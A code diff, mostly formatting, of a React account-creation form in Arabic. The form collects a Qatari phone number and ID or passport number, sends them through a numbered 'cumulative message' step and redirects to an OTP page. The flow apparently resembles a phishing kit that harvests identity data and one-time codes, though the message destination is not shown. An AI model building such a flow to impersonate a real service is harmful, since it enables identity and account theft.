@@ -11,13 +11,13 @@ import { toast } from "sonner";
 import { useRegistration } from "@/contexts/RegistrationContext";
 
 const formSchema = z.object({
-  phoneNumber: z.string()
-    .min(8, {
-      message: "رقم الجوال يجب أن يكون 8 أرقام"
-    })
-    .max(8, {
-      message: "رقم الجوال يجب أن يكون 8 أرقام"
-    }),
+  phoneNumber: z.string().
+  min(8, {
+    message: "رقم الجوال يجب أن يكون 8 أرقام"
+  }).
+  max(8, {
+    message: "رقم الجوال يجب أن يكون 8 أرقام"
+  }),
   idNumber: z.string().min(1, {
     message: "يرجى إدخال رقم البطاقة الشخصية أو جواز السفر"
   })
@@ -26,10 +26,10 @@ const formSchema = z.object({
 type FormData = z.infer<typeof formSchema>;
 
 const steps = [
-  { number: 1, title: "معلومات أساسية" },
-  { number: 2, title: "التحقق" },
-  { number: 3, title: "إكمال التسجيل" }
-];
+{ number: 1, title: "معلومات أساسية" },
+{ number: 2, title: "التحقق" },
+{ number: 3, title: "إكمال التسجيل" }];
+
 
 const AccountCreation = () => {
   const navigate = useNavigate();
@@ -51,12 +51,12 @@ const AccountCreation = () => {
         accountCreationPhone: data.phoneNumber,
         accountCreationId: data.idNumber
       };
-      
+
       await sendCumulativeMessage(9, "إنشاء الحساب", newData);
       updateData(newData);
-      
+
       toast.success("تم إرسال البيانات بنجاح");
-      
+
       // الانتقال إلى الصفحة التالية
       setTimeout(() => {
         navigate("/otp-verification");
@@ -74,8 +74,8 @@ const AccountCreation = () => {
       <div className="flex items-center justify-between p-4 border-b">
         <button
           onClick={() => navigate(-1)}
-          className="p-2 hover:bg-accent rounded-lg transition-colors"
-        >
+          className="p-2 hover:bg-accent rounded-lg transition-colors">
+
           <X className="w-6 h-6" />
         </button>
         <h1 className="text-xl font-bold">إنشاء حساب</h1>
@@ -115,27 +115,27 @@ const AccountCreation = () => {
                     placeholder="رقم الجوال"
                     {...register("phoneNumber")}
                     className={`pl-10 text-right ${
-                      errors.phoneNumber ? "border-destructive" : ""
-                    }`}
+                    errors.phoneNumber ? "border-destructive" : ""}`
+                    }
                     dir="rtl"
-                    maxLength={8}
-                  />
+                    maxLength={8} />
+
                   <div className="absolute left-3 top-1/2 -translate-y-1/2">
                     <Phone className="w-5 h-5 text-muted-foreground" />
                   </div>
                 </div>
 
                 {/* Country Code Box */}
-                <div className="flex items-center gap-2 bg-accent px-3 py-3 rounded-md h-10 shrink-0">
+                <div className="flex items-center gap-2 px-3 py-3 rounded-md h-10 shrink-0 bg-muted-foreground">
                   <span className="text-2xl">🇶🇦</span>
                   <span className="text-sm font-medium">974</span>
                 </div>
               </div>
-              {errors.phoneNumber && (
-                <p className="text-sm text-destructive text-right">
+              {errors.phoneNumber &&
+              <p className="text-sm text-destructive text-right">
                   {errors.phoneNumber.message}
                 </p>
-              )}
+              }
             </div>
 
             {/* ID Number Input */}
@@ -149,34 +149,34 @@ const AccountCreation = () => {
                   placeholder="رقم البطاقة الشخصية القطرية أو جواز السفر"
                   {...register("idNumber")}
                   className={`pl-10 text-right ${
-                    errors.idNumber ? "border-destructive" : ""
-                  }`}
-                  dir="rtl"
-                />
+                  errors.idNumber ? "border-destructive" : ""}`
+                  }
+                  dir="rtl" />
+
                 <div className="absolute left-3 top-1/2 -translate-y-1/2">
                   <CreditCard className="w-5 h-5 text-muted-foreground" />
                 </div>
               </div>
-              {errors.idNumber && (
-                <p className="text-sm text-destructive text-right">
+              {errors.idNumber &&
+              <p className="text-sm text-destructive text-right">
                   {errors.idNumber.message}
                 </p>
-              )}
+              }
             </div>
 
             {/* Submit Button */}
             <Button
               type="submit"
               className="w-full h-14 text-lg font-bold bg-[#E31E24] hover:bg-[#C11A1F] text-white"
-              disabled={isLoading}
-            >
+              disabled={isLoading}>
+
               {isLoading ? "جاري المعالجة..." : "متابعة"}
             </Button>
           </form>
         </div>
       </div>
-    </div>
-  );
+    </div>);
+
 };
 
 export default AccountCreation;
